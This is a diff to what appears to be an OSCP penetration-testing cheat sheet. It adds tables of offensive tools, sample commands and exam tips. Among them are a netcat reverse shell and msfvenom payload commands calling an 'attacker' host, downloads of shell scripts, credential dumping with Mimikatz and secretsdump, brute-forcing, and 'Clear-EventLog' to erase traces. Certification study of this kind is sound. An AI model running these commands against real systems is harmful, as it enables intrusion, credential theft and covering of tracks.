@@ -340,23 +340,121 @@
       `sudo neo4j console`
 
 ## Recommended OSCP Cracking Tools & Usage (2025)
-| Tool              | Purpose                                  | Sample Command |
-|------------------|------------------------------------------|----------------|
-| **Hydra**         | Brute-force login to services (SSH, FTP, etc.) | `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10` |
-| **John the Ripper** | Offline password hash cracking           | `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` |
-| **Hashcat**       | GPU-accelerated hash cracking             | `hashcat -m 1000 -a 0 hash.txt rockyou.txt` |
-| **Nmap**          | Network scan & service enumeration        | `nmap -sC -sV -oN scan.txt 10.10.10.10` |
-| **AutoRecon**     | Automated enumeration & scanning          | `autorecon 10.10.10.10` |
-| **Gobuster**      | Web directory brute-forcing               | `gobuster dir -u http://10.10.10.10 -w wordlist.txt` |
-| **Feroxbuster**   | Fast recursive content discovery          | `feroxbuster -u http://10.10.10.10 -w wordlist.txt` |
-| **WFuzz**         | Web fuzzing tool                          | `wfuzz -c -z file,rockyou.txt --hc 404 http://target/FUZZ` |
-| **Impacket**      | Windows SMB, RPC, MSSQL enumeration       | `wmiexec.py user:pass@10.10.10.10` |
-| **CrackMapExec**  | SMB + post-exploitation framework         | `crackmapexec smb 10.10.10.10 -u user -p pass` |
-| **Evil-WinRM**    | WinRM shell for Windows                   | `evil-winrm -i 10.10.10.10 -u admin -p pass123` |
-| **Metasploit**    | Exploits, payloads, post-exploitation     | `msfconsole` → use exploits |
-| **Responder**     | Capture NetNTLM hashes via LLMNR poisoning| `responder -I eth0` |
-| **Burp Suite**    | Web interception and vulnerability testing| GUI Tool |
-| **FFUF**          | Fast web content discovery                | `ffuf -u http://target/FUZZ -w wordlist.txt` |
-| **XFreeRDP**      | RDP client with hash support              | `xfreerdp /v:10.10.10.10 /u:user /pth:<NTLM_HASH> /cert-ignore` |
-| **LinPEAS**       | Linux local privilege escalation script   | `./linpeas.sh` |
-| **SecLists**      | Wordlists for brute-force/fuzzing         | Use with tools above 
+| Tool              | Purpose                                  | Sample Command | Info / Output |
+|------------------|------------------------------------------|----------------|----------------|
+| **nmap**          | Port scan, service/version detection      | `nmap -sC -sV -oN scan.txt 10.10.10.10` | Shows open ports, services, versions, default scripts |
+| **AutoRecon**     | Automated enumeration pipeline            | `autorecon 10.10.10.10` | Organizes scans, runs Nmap, Gobuster, LinPEAS automatically |
+| **Gobuster**      | Web directory brute-force                 | `gobuster dir -u http://target -w common.txt` | Lists hidden directories or files |
+| **Feroxbuster**   | Recursive web content discovery           | `feroxbuster -u http://target -w wordlist.txt` | Recursively finds directories/files |
+| **FFUF**          | Fast web fuzzing                          | `ffuf -u http://target/FUZZ -w wordlist.txt` | Reveals valid endpoints via response codes |
+| **WFuzz**         | Web input fuzzing                         | `wfuzz -c -z file,rockyou.txt --hc 404 http://target/FUZZ` | Discovers fuzzable parameters, paths |
+| **Nikto**         | Web server vulnerability scanner          | `nikto -h http://target` | Lists known issues in web server setup |
+| **Burp Suite**    | Manual/intercept web testing              | GUI Tool       | Captures/fuzzes requests, intercepts traffic |
+| **Hydra**         | Brute-force remote logins                 | `hydra -l admin -P rockyou.txt ssh://10.10.10.10` | Cracks login credentials |
+| **John the Ripper** | Offline hash cracking                   | `john hash.txt --wordlist=rockyou.txt` | Cracked hash output |
+| **Hashcat**       | GPU-based hash cracking                   | `hashcat -m 1000 hash.txt rockyou.txt` | Fast crack of NTLM or other hashes |
+| **wget**          | Download files                            | `wget http://10.10.10.10/file.sh` | Saves remote file locally |
+| **curl**          | File transfer / request testing           | `curl -O http://10.10.10.10/file.sh` | Displays or downloads response |
+| **ncat** (netcat) | File transfer, bind/reverse shell         | `ncat -lvnp 4444` / `ncat -e /bin/bash attacker 4444` | Listener or shell |
+| **ssh**           | Remote login via SSH                      | `ssh user@10.10.10.10` | Secure shell access |
+| **python**        | Simple webserver, reverse shell, etc.     | `python3 -m http.server` or `python -c 'reverse shell'` | Serve payloads or pop shells |
+| **Impacket**      | Remote access tools (SMB/RPC)             | `wmiexec.py user:pass@10.10.10.10` | Remote shell, file transfer, SID enumeration |
+| **CrackMapExec**  | SMB tool + post-exploitation              | `cme smb 10.10.10.10 -u user -p pass` | Check share access, dump hashes, validate creds |
+| **Responder**     | LLMNR/NetBIOS poisoning                   | `responder -I eth0` | Captures NTLMv2 hashes |
+| **LinPEAS**       | Linux privilege escalation script         | `./linpeas.sh` | Highlights privesc vectors in color |
+| **WinPEAS**       | Windows privilege escalation script       | `winPEASx64.exe` | Checks for service misconfigs, ACLs, registry abuse |
+| **Chisel**        | Tunneling over HTTP                       | `chisel server -p 9001` / `chisel client attacker:9001 R:localhost:3389` | Pivoting, port forwarding |
+| **Mimikatz**      | Credential dumping (Windows)              | `privilege::debug`, `sekurlsa::logonpasswords` | Reveals passwords, hashes, tickets |
+| **msfvenom**      | Payload generation                        | `msfvenom -p windows/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe -o shell.exe` | Generates reverse shell binaries |
+| **Metasploit**    | Exploits + post modules                   | `msfconsole` → use exploits | Interactive exploit framework with session management |
+
+## 📝 OSCP Pro Tips
+- Always start with **Nmap**, **AutoRecon**, and web enumeration tools.
+- Use **Burp**, **WFUF**, and **Feroxbuster** for web fuzzing.
+- After access, use **LinPEAS** or **WinPEAS** for privilege escalation paths.
+- Use **Impacket**, **CME**, or **Chisel** for pivoting.
+- Crack hashes using **John**, **Hashcat**, or online resources.
+
+| Tip Category       | Tip |
+|--------------------|-----|
+| **General Strategy** | Start with **AutoRecon or manual Nmap**, then branch into web (Gobuster/Feroxbuster), SMB (CME/Impacket), or known services. |
+| **Time Management** | Spend no more than 1 hour per box if you're stuck. Move on and return later. |
+| **Initial Foothold** | Look for unauthenticated pages, exposed SMB/NFS shares, backup files (`.bak`, `.zip`), default creds. |
+| **Passwords** | Try **rockyou.txt** and known weak creds. Look for reused passwords across services. |
+| **Linux Privesc** | Run `linpeas.sh`, check for SUID binaries, writable `/etc/passwd`, crontabs, misconfigured services. |
+| **Windows Privesc** | Use `winPEAS`, `whoami /priv`, and check for AlwaysInstallElevated, weak folder permissions, unquoted service paths. |
+| **Reverse Shell Tips** | Use `ncat`, `msfvenom`, or `bash -i >& /dev/tcp` variants. Have multiple listeners ready (4444, 5555). |
+| **Pivoting** | Use **Chisel** or **SSH tunnels** to reach internal networks. Don’t overlook second-level escalation. |
+| **Reporting** | Take screenshots of each flag, privilege escalation step, and exploit. Label clearly. |
+| **Persistence** | If you lose shell, try to re-exploit quickly. Always upload a reverse shell backup (`nc.exe`, `bash shell`, etc.). |
+| **VPN Stability** | If VPN disconnects, your *target machines will reset*. Save all notes **locally** in case of resets. |
+| **Proof Files** | Submit `proof.txt` and `local.txt` for each rooted box. These are essential for point calculation. |
+| **Mental Game** | Stay calm. 3 roots + 1 user = pass. Don’t panic over one tough box. Maximize your strengths. |
+
+## 🟡 1. Information Gathering / Recon
+| Tool            | Purpose                                | Sample Command |
+|-----------------|----------------------------------------|----------------|
+| `nmap`          | Port scanning, service/version detect  | `nmap -sC -sV -oN scan.txt 10.10.10.10` |
+| `AutoRecon`     | Automated recon pipeline               | `autorecon 10.10.10.10` |
+| `whatweb`       | Detect web technologies                | `whatweb http://target` |
+| `gobuster`      | Web dir brute-force                    | `gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt` |
+| `feroxbuster`   | Recursive web discovery                | `feroxbuster -u http://target -w wordlist.txt` |
+| `ffuf`          | Web fuzzing                            | `ffuf -u http://target/FUZZ -w wordlist.txt` |
+| `nikto`         | Web vulnerability scanner              | `nikto -h http://target` |
+| `whatweb`       | Identify web frameworks                 | `whatweb http://target` |
+| `theHarvester`  | Email, domain, subdomain harvesting    | `theharvester -d target.com -b google` |
+| `amass`         | Subdomain enumeration                  | `amass enum -d target.com` |
+
+## 🔵 2. Enumeration
+| Tool             | Purpose                                 | Sample Command |
+|------------------|-----------------------------------------|----------------|
+| `enum4linux-ng`  | Enumerate Windows shares, users         | `enum4linux-ng -A 10.10.10.10` |
+| `crackmapexec`   | SMB, RDP, WinRM share/user checks       | `cme smb 10.10.10.10 -u user -p pass` |
+| `smbclient`      | Access SMB shares                       | `smbclient //10.10.10.10/share` |
+| `ldapsearch`     | Query LDAP directory                    | `ldapsearch -x -h 10.10.10.10 -b "dc=example,dc=com"` |
+| `snmpwalk`       | SNMP device enumeration                 | `snmpwalk -v2c -c public 10.10.10.10` |
+| `sqlmap`         | Automated SQLi and DB dump              | `sqlmap -u "http://target?id=1" --dbs` |
+| `wfuzz`          | Web fuzzing                             | `wfuzz -c -z file,wordlist.txt --hc 404 http://target/FUZZ` |
+| `impacket-samrdump` | SAMR info enumeration                | `samrdump.py 10.10.10.10` |
+
+## 🟢 3. Gaining Access (Exploitation)
+
+| Tool           | Purpose                                  | Sample Command |
+|----------------|------------------------------------------|----------------|
+| `msfvenom`     | Payload generation                        | `msfvenom -p windows/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe > shell.exe` |
+| `Metasploit`   | Framework for exploitation                | `msfconsole → use exploit/multi/handler` |
+| `ncat`         | Reverse shell handling                    | `ncat -lvnp 4444` |
+| `python`       | Simple webserver                          | `python3 -m http.server 80` |
+| `wget` / `curl`| File retrieval                            | `wget http://attacker/shell.sh` |
+| `searchsploit` | Local exploit database search             | `searchsploit apache 2.4` |
+| `nishang`      | PowerShell payloads                       | Import scripts for Windows shells |
+
+## 🟠 4. Privilege Escalation
+| Tool             | Purpose                                | Sample Command |
+|------------------|----------------------------------------|----------------|
+| `linpeas.sh`     | Linux privesc script                    | `./linpeas.sh` |
+| `winPEAS.exe`    | Windows privesc script                  | `winPEASx64.exe` |
+| `sudo -l`        | List sudo privileges                    | `sudo -l` |
+| `pspy`           | Monitor Linux processes                 | `./pspy64` |
+| `linux-exploit-suggester.sh` | Kernel exploit suggestions | `./linux-exploit-suggester.sh` |
+| `windows-exploit-suggester.py` | Windows patch-based escalation | `python windows-exploit-suggester.py` |
+| `mimikatz`       | Credential dumping on Windows           | `sekurlsa::logonpasswords` |
+
+## 🔴 5. Post-Exploitation / Lateral Movement
+| Tool             | Purpose                                | Sample Command |
+|------------------|----------------------------------------|----------------|
+| `wmiexec.py`     | Remote command execution via WMI       | `wmiexec.py user:pass@target` |
+| `psexec.py`      | Run commands via SMB                   | `psexec.py user:pass@target` |
+| `secretsdump.py` | Dump Windows hashes                    | `secretsdump.py user:pass@target` |
+| `chisel`         | TCP tunneling / pivoting               | `chisel client attacker:9001 R:127.0.0.1:3389` |
+| `responder`      | LLMNR poisoning                        | `responder -I eth0` |
+| `BloodHound`     | AD enumeration via neo4j               | Use with `SharpHound` collector |
+
+## 🟣 6. Reporting & Cleanup
+| Tool              | Purpose                               | Sample Command |
+|-------------------|---------------------------------------|----------------|
+| `asciinema`       | Terminal session recording            | `asciinema rec` |
+| `screenshot tools`| Capture flags / proof steps           | Manual or `gnome-screenshot` |
+| `cherrytree`      | Reporting and note keeping            | GUI |
+| `keepnote`        | Note organization                     | GUI |
+| `rm`, `Clear-EventLog` | Clean traces (if allowed)        | Manual cleanup |
